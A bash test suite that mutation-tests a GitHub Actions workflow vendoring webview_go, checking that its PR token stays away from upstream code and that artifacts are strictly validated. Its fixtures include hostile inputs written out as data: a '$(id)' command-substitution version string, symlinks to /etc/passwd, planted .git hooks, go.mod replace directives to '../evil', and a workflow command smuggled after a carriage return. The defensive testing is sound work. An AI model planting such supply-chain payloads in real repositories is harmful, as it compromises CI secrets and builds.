	expect_caught 'the webview PR with no refusal when its token is missing (#983)' catalog-pr "$WORKFLOWS/update-webview.yml" \
		'          if [ -z "$WEBVIEW_PR_TOKEN" ]; then' '          if false; then' \
		'publish: step Open / update the bump PR: no earlier step refuses when RELEASE_PR_TOKEN is empty'
	expect_caught 'a webview refusal that only warns (#983)' catalog-pr "$WORKFLOWS/update-webview.yml" \
		$'on this repository."\n            exit 1\n' $'on this repository."\n' \
		'no earlier step refuses when RELEASE_PR_TOKEN is empty'
	expect_caught 'a webview refusal under a condition the PR step does not have (#983)' catalog-pr "$WORKFLOWS/update-webview.yml" \
		$'      - name: Refuse without the webview PR token\n' $'      - name: Refuse without the webview PR token\n        if: github.event_name == \x27schedule\x27\n' \
		'no earlier step refuses when RELEASE_PR_TOKEN is empty'
	expect_caught 'the PAT handed to the job that builds upstream code (#983)' catalog-pr "$WORKFLOWS/update-webview.yml" \
		$'        env:\n          CGO_ENABLED: "1"\n        run: |\n          set -euo pipefail\n          go vet ./...' $'        env:\n          CGO_ENABLED: "1"\n          GH_TOKEN: ${{ secrets.RELEASE_PR_TOKEN }}\n        run: |\n          set -euo pipefail\n          go vet ./...' \
		'secrets.RELEASE_PR_TOKEN is read 3 times'
	# ...and the same, seen by the rule that keeps upstream code away from
	# any secret: the Go tests run with the PAT in reach.
	expect_caught 'the build job reading the PAT while it runs the Go tests (#983)' untrusted "$WORKFLOWS/update-webview.yml" \
		$'        env:\n          CGO_ENABLED: "1"\n        run: |\n          set -euo pipefail\n          go vet ./...' $'        env:\n          CGO_ENABLED: "1"\n          GH_TOKEN: ${{ secrets.RELEASE_PR_TOKEN }}\n        run: |\n          set -euo pipefail\n          go vet ./...' \
		'build: step Compat - build + vet + test (linux/amd64, cgo): builds or tests Go code (module code is compiled or run) in a job holding a secret other than GITHUB_TOKEN: go test ./...'
	expect_caught 'the Go tests back in the job holding the PAT (#983)' untrusted "$WORKFLOWS/update-webview.yml" \
		'      - name: Open / update the bump PR' $'      - run: cd sidecar && go test ./...\n      - name: Open / update the bump PR' \
		'publish: step 4: builds or tests Go code (module code is compiled or run) in a job holding a secret other than GITHUB_TOKEN'
	expect_caught 'go -C running the Go tests in the job holding the PAT (review of #983)' untrusted "$WORKFLOWS/update-webview.yml" \
		'      - name: Open / update the bump PR' $'      - run: go -C sidecar test ./...\n      - name: Open / update the bump PR' \
		'publish: step 4: builds or tests Go code'
	expect_caught 'a repository script behind a directory in the job holding the PAT (review of #983)' untrusted "$WORKFLOWS/update-webview.yml" \
		'      - name: Open / update the bump PR' $'      - run: $GITHUB_WORKSPACE/scripts/vendor-webview.sh x\n      - name: Open / update the bump PR' \
		'publish: step 4: runs a repository script'
	expect_caught 'the vendoring script back in the job holding the PAT (#983)' untrusted "$WORKFLOWS/update-webview.yml" \
		'      - name: Open / update the bump PR' $'      - run: scripts/vendor-webview.sh "$VERSION"\n      - name: Open / update the bump PR' \
		'publish: step 4: runs a repository script in a job holding a secret other than GITHUB_TOKEN'
	expect_caught 'the job holding the PAT checking out with its token persisted (#983)' narrow "$WORKFLOWS/update-webview.yml" \
		$'        with:\n          persist-credentials: false\n\n      - uses: actions/download-artifact@' $'\n      - uses: actions/download-artifact@' \
		'publish: checkout leaves the token in .git/config'
}
# The vendor dir carries a .gitattributes, which upload-artifact leaves out
# unless it is asked to include hidden files; the PR would then delete it.
hidden_check() {
	# shellcheck disable=SC2016 # JavaScript source, not shell.
	FILE="$1" bun -e '
const d = Bun.YAML.parse(await Bun.file(process.env.FILE).text());
const up = (d.jobs?.build?.steps ?? []).filter((s) => String(s.uses ?? "").toLowerCase().startsWith("actions/upload-artifact@") && s.with?.name === "webview-bump");
if (up.length !== 1) console.log("build uploads webview-bump " + up.length + " times, not once");
else if (up[0].with["include-hidden-files"] !== true) console.log("the webview-bump upload leaves hidden files out (include-hidden-files is " + JSON.stringify(up[0].with["include-hidden-files"]) + ")");
'
}
found="$(hidden_check "$WORKFLOWS/update-webview.yml")" || found="the bun helper failed"
if [ -z "$found" ]; then ok "update-webview.yml: the vendored tree is uploaded with its hidden files (#983)"; else no "update-webview.yml: the vendored tree is uploaded with its hidden files (#983)" "$found"; fi
copy="${WORK}/hidden.yml"
if FROM="$WORKFLOWS/update-webview.yml" TO="$copy" OLD=$'          include-hidden-files: true\n' NEW='' bun -e '
const s = await Bun.file(process.env.FROM).text();
if (!s.includes(process.env.OLD)) process.exit(2);
await Bun.write(process.env.TO, s.replace(process.env.OLD, () => process.env.NEW));
' && grep -qF 'leaves hidden files out' <<<"$(hidden_check "$copy")"; then
	ok "reports: the vendored tree uploaded without its hidden files (#983)"
else
	no "reports: the vendored tree uploaded without its hidden files (#983)"
fi
# The job holding the PAT runs exactly these steps and nothing else
# (review of #983): the refusal, a checkout, the artifact, the copy, and
# create-pull-request, the two scripts line for line (comment and blank
# lines aside), each step with no shell, working directory or env beyond
# its own, and the job with no env, defaults, container or services. A
# list of what may not run there (Go, a script) is never complete; this is
# the list of what does.
# pat_job_check <workflow>: one violation per line, nothing when clean.
pat_job_check() {
	# shellcheck disable=SC2016 # JavaScript source, not shell.
	FILE="$1" bun -e '
const d = Bun.YAML.parse(await Bun.file(process.env.FILE).text());
const out = [];
const job = d.jobs?.publish ?? {};
const code = (r) => String(r).split("\n").map((l) => l.trim()).filter((l) => l && !l.startsWith("#"));
const scripts = [
  // Refuse without the webview PR token
  [
    "if [ -z \"$WEBVIEW_PR_TOKEN\" ]; then",
    "echo \"::error::RELEASE_PR_TOKEN is not set, so the webview_go bump PR would open without CI and could never merge (#983).\"",
    "echo \"Add a fine-grained PAT with Contents: read and write, and Pull requests: read and write, on this repository.\"",
    "exit 1",
    "fi",
  ],
  // Put the vendored tree in place
  [
    "set -euo pipefail",
    "in=\"$RUNNER_TEMP/webview-bump\"",
    "files=\"$(find \"$in\" -type f | wc -l)\"",
    "dirs=\"$(find \"$in\" -type d | wc -l)\"",
    "if [ \"$files\" -gt 100 ] || [ \"$dirs\" -gt 50 ]; then",
    "echo \"::error::the webview-bump artifact holds more than 100 files or 50 directories (#1049)\"",
    "exit 1",
    "fi",
    "sizes=\"$(find \"$in\" -type f -printf \x27%s\\n\x27)\"",
    "bytes=0",
    "while read -r size; do",
    "bytes=$((bytes + size))",
    "done <<<\"$sizes\"",
    "if [ \"$bytes\" -gt 8388608 ]; then",
    "echo \"::error::the webview-bump artifact holds more than 8 MiB (#1049)\"",
    "exit 1",
    "fi",
    "if [ -n \"$(find \"$in\" -mindepth 1 -not -type f -not -type d -print -quit)\" ]; then",
    "echo \"::error::the webview-bump artifact holds something other than files and directories\"",
    "exit 1",
    "fi",
    "if [ -n \"$(find \"$in\" -mindepth 1 -iname .git -print -quit)\" ]; then",
    "echo \"::error::the webview-bump artifact holds a .git\"",
    "exit 1",
    "fi",
    "if [ -n \"$(LC_ALL=C find \"$in\" -mindepth 1 -name \x27*[!A-Za-z0-9._+-]*\x27 -print -quit)\" ]; then",
    "echo \"::error::the webview-bump artifact holds a name outside A-Za-z0-9._+-\"",
    "exit 1",
    "fi",
    "if [ \"$(find \"$in\" -mindepth 1 -maxdepth 1 | wc -l)\" != 3 ] || [ ! -f \"$in/go.mod\" ] || [ ! -f \"$in/go.sum\" ] || [ ! -d \"$in/webview_go\" ]; then",
    "echo \"::error::the webview-bump artifact is not the vendor dir and the two module files\"",
    "exit 1",
    "fi",
    "if [ \"$(cat \"$in/webview_go/UPSTREAM_VERSION\" 2>/dev/null)\" != \"$VERSION\" ]; then",
    "echo \"::error::the vendored tree records another version than ${VERSION}\"",
    "exit 1",
    "fi",
    "top=\"$(find \"$in/webview_go\" -mindepth 1 -maxdepth 1 -printf \x27%y %f\\n\x27)\"",
    "libs=\"$(find \"$in/webview_go\" -mindepth 2 -type f -printf \x27%P\\n\x27)\"",
    "while read -r kind name; do",
    "case \"$kind $name\" in",
    "\"d libs\" | \"f go.mod\" | \"f go.sum\" | \"f UPSTREAM_VERSION\" | \"f JARVIS_PATCH.md\" | \"f jarvis.patch\" | \"f .gitattributes\" | \"f LICENSE\") ;;",
    "\"f \"*_test.go) echo \"::error::the vendored tree holds ${name}, a test file vendor-webview.sh does not copy (#1049)\"; exit 1 ;;",
    "\"f \"*.go | \"f \"*.cc | \"f \"*.c | \"f \"*.h) ;;",
    "*) echo \"::error::the vendored tree holds ${name}, which vendor-webview.sh does not copy (#1049)\"; exit 1 ;;",
    "esac",
    "done <<<\"$top\"",
    "while read -r name; do",
    "case \"$name\" in",
    "\"\" | libs/*_test.go) [ -z \"$name\" ] || { echo \"::error::the vendored tree holds ${name}, a test file (#1049)\"; exit 1; } ;;",
    "libs/*.h | libs/*.go | libs/*.txt | libs/*/LICENSE) ;;",
    "*) echo \"::error::the vendored tree holds ${name}, which is not a header, Go file, text or license under libs/ (#1049)\"; exit 1 ;;",
    "esac",
    "done <<<\"$libs\"",
    "for f in .gitattributes jarvis.patch JARVIS_PATCH.md; do",
    "if ! cmp -s \"$in/webview_go/$f\" \"sidecar/third_party/webview_go/$f\"; then",
    "echo \"::error::the bump changes ${f}, which vendor-webview.sh keeps from main (#1049)\"",
    "exit 1",
    "fi",
    "done",
    "if [ -n \"$(find \"$in/webview_go\" -mindepth 2 -iname \x27.git*\x27 -print -quit)\" ]; then",
    "echo \"::error::the vendored tree holds a .git file below its top, such as a .gitattributes (#1049)\"",
    "exit 1",
    "fi",
    "if ! cmp -s \"$in/go.sum\" sidecar/go.sum; then",
    "echo \"::error::the bumped sidecar/go.sum differs from main (#1049)\"",
    "exit 1",
    "fi",
    "if [ ! -f \"$in/webview_go/go.mod\" ]; then",
    "echo \"::error::the vendored tree holds no go.mod (#1049)\"",
    "exit 1",
    "fi",
    "directives() {",
    "awk \x27{ sub(/\\/\\/.*/, \"\") } NF == 0 { next } { $1 = $1 } $0 == \")\" { block = \"\"; next } NF == 2 && $2 == \"(\" { block = $1; next } block != \"\" { print block \" \" $0; next } { print }\x27 \"$1\" | LC_ALL=C sort",
    "}",
    "main_mod=\"$(directives sidecar/go.mod)\"",
    "new_mod=\"$(directives \"$in/go.mod\")\"",
    "if [ \"$new_mod\" != \"$main_mod\" ]; then",
    "echo \"::error::the bumped sidecar/go.mod differs from main in its directives (#1049):\"",
    "diff <(printf \x27%s\\n\x27 \"$main_mod\") <(printf \x27%s\\n\x27 \"$new_mod\") | cat -v || true",
    "exit 1",
    "fi",
    "main_mod=\"$(directives sidecar/third_party/webview_go/go.mod | awk \x27$1 != \"go\" && $1 != \"require\"\x27)\"",
    "new_mod=\"$(directives \"$in/webview_go/go.mod\" | awk \x27$1 != \"go\" && $1 != \"require\"\x27)\"",
    "if [ \"$new_mod\" != \"$main_mod\" ]; then",
    "echo \"::error::the vendored go.mod differs from main in a directive other than go and require (#1049):\"",
    "diff <(printf \x27%s\\n\x27 \"$main_mod\") <(printf \x27%s\\n\x27 \"$new_mod\") | cat -v || true",
    "exit 1",
    "fi",
    "rm -rf sidecar/third_party/webview_go",
    "cp -R \"$in/webview_go\" sidecar/third_party/webview_go",
    "cp \"$in/go.mod\" \"$in/go.sum\" sidecar/",
  ],
];
const want = [
  { name: "Refuse without the webview PR token", run: scripts[0], env: ["WEBVIEW_PR_TOKEN"] },
  { uses: "actions/checkout@" },
  { uses: "actions/download-artifact@" },
  { name: "Put the vendored tree in place", run: scripts[1], env: ["VERSION"] },
  { uses: "peter-evans/create-pull-request@" },
];
for (const k of ["env", "defaults", "container", "services", "continue-on-error"]) if (job[k] !== undefined) out.push("publish: has " + k + ":");
const steps = job.steps ?? [];
if (steps.length !== want.length) out.push("publish: runs " + steps.length + " steps, not the " + want.length + " listed");
steps.forEach((st, i) => {
  const w = want[i] ?? {};
  const label = "publish: step " + (st.name ?? st.uses ?? String(i));
  for (const k of Object.keys(st)) if (!["name", "id", "if", "env", "run", "uses", "with"].includes(k)) out.push(label + " has " + k + ":");
  if (w.uses !== undefined && !String(st.uses ?? "").toLowerCase().startsWith(w.uses)) out.push(label + " is not " + w.uses);
  if (w.run !== undefined) {
    if (st.name !== w.name || typeof st.run !== "string") out.push(label + " is not the step " + w.name);
    else if (JSON.stringify(code(st.run)) !== JSON.stringify(w.run)) out.push(label + " runs a script other than the listed one: " + JSON.stringify(code(st.run).filter((l, n) => l !== w.run[n])));
  } else if (st.run !== undefined) out.push(label + " runs a script");
  const env = Object.keys(st.env ?? {});
  if (JSON.stringify(env) !== JSON.stringify(w.env ?? [])) out.push(label + " has env " + JSON.stringify(env) + ", not " + JSON.stringify(w.env ?? []));
});
if (out.length) console.log(out.join("\n"));
'
}
found="$(pat_job_check "$WORKFLOWS/update-webview.yml")" || found="the bun helper failed"
if [ -z "$found" ]; then ok "update-webview.yml: the job holding the PAT runs exactly its listed steps (review of #983)"; else no "update-webview.yml: the job holding the PAT runs exactly its listed steps (review of #983)" "$found"; fi
# pat_job_caught <label> <exact text> <replacement> <reason>
pat_job_caught() {
	local copy="${WORK}/pat-job.yml"
	if ! FROM="$WORKFLOWS/update-webview.yml" TO="$copy" OLD="$2" NEW="$3" bun -e '
const s = await Bun.file(process.env.FROM).text();
if (!s.includes(process.env.OLD)) process.exit(2);
await Bun.write(process.env.TO, s.replace(process.env.OLD, () => process.env.NEW));
'; then
		no "PAT job mutant '$1' could be applied (update-webview.yml no longer has the text it mutates)"
		return
	fi
	found="$(pat_job_check "$copy")" || found="the bun helper failed"
	if grep -qF -- "$4" <<<"$found"; then ok "reports: $1"; else no "reports: $1, for the reason it exists" "wanted '${4}', got: ${found}"; fi
}
# shellcheck disable=SC2016 # literal workflow text, not shell.
{
	pat_job_caught 'the artifact run by a step added to the job holding the PAT (review of #983)' \
		'      - name: Open / update the bump PR' $'      - run: bash "$RUNNER_TEMP/webview-bump/webview_go/build.sh"\n      - name: Open / update the bump PR' \
		'publish: runs 6 steps, not the 5 listed'
	pat_job_caught 'the artifact run from inside the copy step (review of #983)' \
		'          cp "$in/go.mod" "$in/go.sum" sidecar/' $'          cp "$in/go.mod" "$in/go.sum" sidecar/\n          bash "$in/webview_go/build.sh" || true' \
		'publish: step Put the vendored tree in place runs a script other than the listed one'
	pat_job_caught 'make run in place of the copy (review of #983)' \
		'          rm -rf sidecar/third_party/webview_go' '          make -C sidecar' \
		'runs a script other than the listed one'
	pat_job_caught 'an action of another name in the job holding the PAT (review of #983)' \
		'        uses: peter-evans/create-pull-request@' '        uses: evil/create-pull-request@' \
		'publish: step Open / update the bump PR is not peter-evans/create-pull-request@'
	pat_job_caught 'the copy run from another directory (review of #983)' \
		$'      - name: Put the vendored tree in place\n' $'      - name: Put the vendored tree in place\n        working-directory: scripts\n' \
		'publish: step Put the vendored tree in place has working-directory:'
	pat_job_caught 'env for every step of the job holding the PAT (review of #983)' \
		$'    timeout-minutes: 15\n    permissions:\n      contents: read\n    steps:\n      # Refuse' $'    timeout-minutes: 15\n    env:\n      GOFLAGS: -mod=mod\n    permissions:\n      contents: read\n    steps:\n      # Refuse' \
		'publish: has env:'
}
# A job that runs past timeout-minutes is cancelled, not failed, so the
# report job takes a cancelled build or publish too (review of #983).
report_check() {
	# shellcheck disable=SC2016 # JavaScript source, not shell.
	FILE="$1" bun -e '
const d = Bun.YAML.parse(await Bun.file(process.env.FILE).text());
const c = String(d.jobs?.report?.if ?? "");
for (const j of ["build", "publish"]) for (const r of ["failure", "cancelled"])
  if (!c.includes("needs." + j + ".result") || !c.includes(r)) { console.log("the report job does not run on a " + r + " " + j + ": " + c); }
if (!/^always\(\) && /.test(c)) console.log("the report job if: does not start with always(), so a cancelled job skips it: " + c);
'
}
found="$(report_check "$WORKFLOWS/update-webview.yml")" || found="the bun helper failed"
if [ -z "$found" ]; then ok "update-webview.yml: a failed or timed-out bump files the tracking issue (review of #983)"; else no "update-webview.yml: a failed or timed-out bump files the tracking issue (review of #983)" "$found"; fi
copy="${WORK}/report.yml"
# shellcheck disable=SC2016 # literal workflow text, not shell.
if FROM="$WORKFLOWS/update-webview.yml" TO="$copy" bun -e '
const s = await Bun.file(process.env.FROM).text();
const m = /    if: always\(\) && needs\.check\.outputs\.changed == .true. && .*\n/.exec(s);
if (!m) process.exit(2);
await Bun.write(process.env.TO, s.replace(m[0], () => "    if: failure() && needs.check.outputs.changed == \x27true\x27\n"));
' && grep -qF 'does not start with always()' <<<"$(report_check "$copy")"; then
	ok "reports: the report job back on failure() alone, which a timeout skips (review of #983)"
else
	no "reports: the report job back on failure() alone, which a timeout skips (review of #983)"
fi
# check, executed verbatim with a dispatch input (so nothing is fetched):
# the pinned version, which the build job writes into the PR, is held to the
# same alphabet as the new one (security review of #983).
CHECK_STEP="$(FILE="$WORKFLOWS/update-webview.yml" bun -e '
const d = Bun.YAML.parse(await Bun.file(process.env.FILE).text());
const st = (d.jobs?.check?.steps ?? []).find((s) => s.id === "cmp");
if (!st || typeof st.run !== "string") process.exit(2);
process.stdout.write(st.run);
')" || CHECK_STEP=""
# check_case <label> <ok|refused> <pinned version file content>
check_case() {
	local d="${WORK}/wvcheck" rc=0
	rm -rf "$d" && mkdir -p "$d/ws/sidecar/third_party/webview_go"
	printf '%s' "$3" >"$d/ws/sidecar/third_party/webview_go/UPSTREAM_VERSION"
	: >"$d/out"
	(cd "$d/ws" && env -i PATH="$PATH" GITHUB_OUTPUT="$d/out" INPUT_VERSION=v0.0.0-20260101000000-abcdef123456 MODULE=github.com/webview/webview_go bash -e -c "${CHECK_STEP_UNDER_TEST:-$CHECK_STEP}") >"$d/log" 2>&1 || rc=$?
	local ok_=0
	case "$2" in
	ok) [ "$rc" -eq 0 ] && grep -qxF 'changed=true' "$d/out" && grep -qxF "current=$3" "$d/out" && ok_=1 ;;
	refused) [ "$rc" -ne 0 ] && ! grep -q '^changed=' "$d/out" && ok_=1 ;;
	esac
	if [ "$ok_" = 1 ]; then ok "webview check: $1"; else no "webview check: $1" "exit ${rc}; out: $(cat "$d/out"); log: $(cat "$d/log")"; fi
}
if [ -z "$CHECK_STEP" ]; then
	no "found update-webview.yml check: cmp"
else
	check_case 'a plain pinned version is read' ok 'v0.0.0-20240101000000-0123456789ab'
	check_case 'a pinned version carrying another output line is refused' refused $'v1\nchanged=false'
	check_case 'a pinned version with shell text in it is refused' refused 'v1$(id)'
	check_case 'an empty pinned version is refused' refused ''
	mutated="$(SRC="$CHECK_STEP" bun -e '
const s = process.env.SRC;
const m = /case "\$current" in\n[^\n]*\nesac\n/.exec(s);
if (!m) process.exit(2);
process.stdout.write(s.replace(m[0], () => ""));
')" || mutated=""
	if [ -z "$mutated" ]; then
		no "webview check mutant could be applied (the step no longer has the text it mutates)"
	elif grep -q "^  FAIL" <<<"$(CHECK_STEP_UNDER_TEST="$mutated" check_case 'a pinned version carrying another output line is refused' refused $'v1\nchanged=false')"; then
		ok "reports: the pinned version taken unchecked again (security review of #983)"
	else
		no "reports: the pinned version taken unchecked again (security review of #983)" "the case passed a step with this hole"
	fi
fi
# The copy into the checkout, executed verbatim against artifacts shaped as
# a job running upstream code could shape them. Each case runs in a fixture
# workspace of its own; an accepted artifact must replace the vendor dir
# exactly (a file upstream dropped is dropped, the hidden one kept), and a
# refused one must fail with an ::error:: and leave the checkout untouched.
COPY_STEP="$(FILE="$WORKFLOWS/update-webview.yml" bun -e '
const d = Bun.YAML.parse(await Bun.file(process.env.FILE).text());
const st = (d.jobs?.publish?.steps ?? []).find((s) => s.name === "Put the vendored tree in place");
if (!st || typeof st.run !== "string") process.exit(2);
process.stdout.write(st.run);
')" || COPY_STEP=""
REAL_SIDECAR="${HERE}/../../sidecar"
# copy_case <label> <ok|refused> <shell run in the artifact dir to shape it>
copy_case() {
	local label="$1" want="$2" shape="$3" d="${WORK}/wvcopy"
	rm -rf "$d" && mkdir -p "$d/ws/sidecar/third_party/webview_go/libs" "$d/tmp/webview-bump/webview_go/libs/webview"
	printf 'old\n' >"$d/ws/sidecar/third_party/webview_go/dropped.go"
	# The files vendor-webview.sh keeps, as main has them, on both sides.
	for f in .gitattributes jarvis.patch JARVIS_PATCH.md; do
		cp "$REAL_SIDECAR/third_party/webview_go/$f" "$d/ws/sidecar/third_party/webview_go/$f"
		cp "$REAL_SIDECAR/third_party/webview_go/$f" "$d/tmp/webview-bump/webview_go/$f"
	done
	# The module files as main has them (#1049): the step compares the
	# artifact with these, directive for directive.
	cp "$REAL_SIDECAR/go.mod" "$d/ws/sidecar/go.mod"
	cp "$REAL_SIDECAR/third_party/webview_go/go.mod" "$d/ws/sidecar/third_party/webview_go/go.mod"
	cp "$REAL_SIDECAR/go.sum" "$d/ws/sidecar/go.sum"
	printf 'package webview\n' >"$d/tmp/webview-bump/webview_go/webview.go"
	printf 'v1.2.3\n' >"$d/tmp/webview-bump/webview_go/UPSTREAM_VERSION"
	printf 'header\n' >"$d/tmp/webview-bump/webview_go/libs/webview/webview.h"
	cp "$REAL_SIDECAR/third_party/webview_go/go.mod" "$d/tmp/webview-bump/webview_go/go.mod"
	# Same directives, written differently (a comment, spacing), so the
	# accepted copy still shows go.mod is replaced.
	{ printf '// go mod tidy\n'; sed 's/^go \(.*\)$/go   \1   \/\/ toolchain line/' "$REAL_SIDECAR/go.mod"; } >"$d/tmp/webview-bump/go.mod"
	cp "$REAL_SIDECAR/go.sum" "$d/tmp/webview-bump/go.sum"
	(cd "$d/tmp/webview-bump" && eval "$shape") || {
		no "webview copy: ${label} (the fixture could not be shaped)"
		return
	}
	cp -R "$d/ws" "$d/before"
	local rc=0
	(cd "$d/ws" && env -i PATH="$PATH" RUNNER_TEMP="$d/tmp" VERSION=v1.2.3 bash -e -c "${COPY_STEP_UNDER_TEST:-$COPY_STEP}") >"$d/log" 2>&1 || rc=$?
	local ok_=0
	case "$want" in
	ok) [ "$rc" -eq 0 ] && diff -r "$d/tmp/webview-bump/webview_go" "$d/ws/sidecar/third_party/webview_go" >/dev/null &&
		cmp -s "$d/tmp/webview-bump/go.mod" "$d/ws/sidecar/go.mod" && cmp -s "$d/tmp/webview-bump/go.sum" "$d/ws/sidecar/go.sum" && ok_=1 ;;
	refused) [ "$rc" -ne 0 ] && grep -q '^::error::' "$d/log" && diff -r "$d/before" "$d/ws" >/dev/null && ok_=1 ;;
	esac
	# A #1049 case is refused by a #1049 check, or by the one it names,
	# not by whatever else happens to fail (security review of #1049).
	local reason="${4:-}"
	[ -z "$reason" ] && [[ "$label" == *"(#1049"* ]] && reason="(#1049)"
	if [ "$want" = refused ] && [ -n "$reason" ] && ! grep -qF -- "$reason" "$d/log"; then ok_=0; fi
	if [ "$ok_" = 1 ]; then ok "webview copy: ${label}"; else no "webview copy: ${label}" "exit ${rc}; log: $(cat "$d/log")"; fi
}
if [ -z "$COPY_STEP" ]; then
	no "found update-webview.yml publish: Put the vendored tree in place"
else
	copy_case 'the vendored tree replaces the old one, its hidden file kept and a dropped file dropped' ok ':'
	copy_case 'a link inside the vendored tree is refused' refused 'ln -s /etc/passwd webview_go/libs/evil.h'
	copy_case 'a module file that is a link is refused' refused 'rm go.sum && ln -s /etc/passwd go.sum'
	copy_case 'a nested .git directory is refused' refused 'mkdir -p webview_go/libs/.git/hooks && printf x >webview_go/libs/.git/hooks/pre-commit'
	copy_case 'a .git file is refused' refused 'printf "gitdir: /tmp/x\n" >webview_go/.git'
	copy_case 'an extra file beside the tree is refused' refused 'printf x >evil.sh'
	copy_case 'a missing go.sum is refused' refused 'rm go.sum'
	copy_case 'the vendor dir as a file is refused' refused 'rm -r webview_go && printf x >webview_go'
	# Review of #983: case, a newline in a name, and the version recorded.
	copy_case 'a .GIT directory, which a case-insensitive git reads as .git, is refused' refused 'mkdir -p webview_go/libs/.GIT/hooks && printf x >webview_go/libs/.GIT/hooks/post-checkout'
	copy_case 'a name with a newline in it, faking the listing, is refused' refused 'rm -r webview_go go.mod go.sum && mkdir "$(printf "go.mod f\ngo.sum f\nwebview_go")"'
	copy_case 'a name with a space in it is refused' refused 'printf x >"webview_go/a b.go"'
	copy_case 'a tree recording another version is refused' refused 'printf "v9.9.9\n" >webview_go/UPSTREAM_VERSION'
	copy_case 'a tree recording no version is refused' refused 'rm webview_go/UPSTREAM_VERSION'
	# #1049: the content of the artifact, not only its shape.
	copy_case 'the committed vendor tree, as a re-vendor of the pinned version gives it, is accepted (#1049)' ok \
		'rm -r webview_go && cp -R "$REAL_SIDECAR/third_party/webview_go" webview_go && printf "v1.2.3\n" >webview_go/UPSTREAM_VERSION && cp "$REAL_SIDECAR/go.mod" "$REAL_SIDECAR/go.sum" .'
	copy_case 'a new replace in sidecar/go.mod is refused (#1049)' refused 'printf "replace golang.org/x/sys => ../evil\n" >>go.mod'
	copy_case 'a new replace inside a block is refused (#1049)' refused 'printf "replace (\n\tgolang.org/x/sys => ../evil\n)\n" >>go.mod'
	copy_case 'the existing replace pointed elsewhere is refused (#1049)' refused 'sed -i "s|=> ./third_party/webview_go|=> ../evil|" go.mod'
	copy_case 'a toolchain directive is refused (#1049)' refused 'printf "toolchain go1.99.0\n" >>go.mod'
	copy_case 'a tool directive is refused (#1049)' refused 'printf "tool evil.example/x\n" >>go.mod'
	copy_case 'a godebug directive is refused (#1049)' refused 'printf "godebug x509sha1=1\n" >>go.mod'
	copy_case 'a moved go directive is refused (#1049)' refused 'sed -i "s/^go   .*/go 1.99.0/" go.mod'
	copy_case 'a require block turned into an exclude block is refused (#1049)' refused 'sed -i "s/^require (/exclude (/" go.mod && grep -q "^exclude (" go.mod'
	copy_case 'a new require is refused (#1049)' refused 'printf "require evil.example/x v1.0.0\n" >>go.mod'
	copy_case 'a require moved to another version inside the block is refused (#1049)' refused 'sed -i "s|golang.org/x/sys v[0-9.]*|golang.org/x/sys v0.1.0|" go.mod && grep -q "x/sys v0.1.0" go.mod'
	copy_case 'a replace in the vendored go.mod is refused (#1049)' refused 'printf "replace golang.org/x/sys => ../evil\n" >>webview_go/go.mod'
	copy_case 'a vendored tree with no go.mod is refused (#1049)' refused 'rm webview_go/go.mod' 'holds no go.mod'
	copy_case 'a vendored go.mod with no module line is refused (#1049)' refused 'sed -i "/^module/d" webview_go/go.mod' 'the vendored go.mod differs'
	copy_case 'a vendored go.mod moving its own go line is accepted (#1049)' ok 'sed -i "s/^go .*/go 1.21/" webview_go/go.mod'
	copy_case 'a build script at the top of the vendored tree is refused (#1049)' refused 'printf "#!/bin/sh\n" >webview_go/build.sh'
	copy_case 'a test file at the top of the vendored tree is refused (#1049)' refused 'printf "package webview\n" >webview_go/webview_test.go'
	copy_case 'an upstream README at the top of the vendored tree is refused (#1049)' refused 'printf x >webview_go/README.md'
	copy_case 'a directory other than libs at the top of the vendored tree is refused (#1049)' refused 'mkdir webview_go/examples && printf x >webview_go/examples/main.go'
	copy_case 'a new C source is accepted (#1049)' ok 'printf "int x;\n" >webview_go/extra.c'
	copy_case 'a license under another name is for a person to take (#1049 review)' refused 'printf x >webview_go/LICENSE-THIRD-PARTY' 'holds LICENSE-THIRD-PARTY'
	# Security review of #1049: built files under a license name, files
	# the script keeps, hidden diffs, go.sum, directories, a carriage return,
	# and go.mod spellings the normaliser must not read as main.
	copy_case 'a LICENSE.syso, which Go links by its extension, is refused (#1049 review)' refused 'printf x >webview_go/LICENSE.syso' 'holds LICENSE.syso'
	copy_case 'a LICENSE_windows_amd64.syso is refused (#1049 review)' refused 'printf x >webview_go/LICENSE_windows_amd64.syso' 'holds LICENSE_windows_amd64.syso'
	copy_case 'a LICENSE_test.go is refused (#1049 review)' refused 'printf "package webview\n" >webview_go/LICENSE_test.go' 'holds LICENSE_test.go'
	copy_case 'a .syso under libs is refused (#1049 review)' refused 'printf x >webview_go/libs/webview/evil_windows_amd64.syso' 'holds libs/webview/evil_windows_amd64.syso'
	copy_case 'assembly under libs is refused (#1049 review)' refused 'printf x >webview_go/libs/webview/evil.S' 'holds libs/webview/evil.S'
	copy_case 'a test file under libs is refused (#1049 review)' refused 'printf "package webview\n" >webview_go/libs/webview/x_test.go' 'a test file'
	copy_case 'a changed .gitattributes is refused (#1049 review)' refused 'printf "*.go -diff linguist-generated=true\n" >>webview_go/.gitattributes' 'changes .gitattributes'
	copy_case 'a changed jarvis.patch is refused (#1049 review)' refused 'printf "\n" >>webview_go/jarvis.patch' 'changes jarvis.patch'
	copy_case 'a changed JARVIS_PATCH.md is refused (#1049 review)' refused 'printf "\n" >>webview_go/JARVIS_PATCH.md' 'changes JARVIS_PATCH.md'
	copy_case 'a .gitattributes under libs is refused (#1049 review)' refused 'printf "* -diff\n" >webview_go/libs/.gitattributes'
	copy_case 'a header inside a .git-named directory under libs is refused (#1049 review)' refused 'mkdir -p webview_go/libs/.gitmodules.d && printf x >webview_go/libs/.gitmodules.d/a.h' 'a .git file below its top'
	copy_case 'a line added to go.sum is refused (#1049 review)' refused 'printf "evil.example/x v1.0.0 h1:AAAA=\n" >>go.sum' 'go.sum differs'
	copy_case 'more than 50 directories is refused (#1049 review)' refused 'for i in $(seq 1 50); do mkdir "webview_go/libs/d$i"; done' '50 directories'
	copy_case 'a CRLF go.mod is refused (#1049 review)' refused 'sed -i "s/\$/\r/" go.mod' 'sidecar/go.mod differs'
	copy_case 'require( with no space is refused (#1049 review)' refused 'sed -i "s/^require (/require(/" go.mod' 'sidecar/go.mod differs'
	copy_case 'a quoted module path is refused (#1049 review)' refused 'sed -i "s|github.com/google/uuid|\"github.com/google/uuid\"|" go.mod' 'sidecar/go.mod differs'
	copy_case 'a workflow command after a carriage return is printed inert (#1049 review)' refused 'printf "toolchain go1.25.0\r::warning title=ok::bump checks passed\n" >>go.mod' 'toolchain go1.25.0^M::warning'
	copy_case 'more than 100 files is refused (#1049)' refused 'for i in $(seq 1 100); do printf x >"webview_go/libs/f$i.h"; done'
	copy_case 'more than 8 MiB is refused (#1049)' refused 'head -c 8388609 /dev/zero >webview_go/libs/big.h'
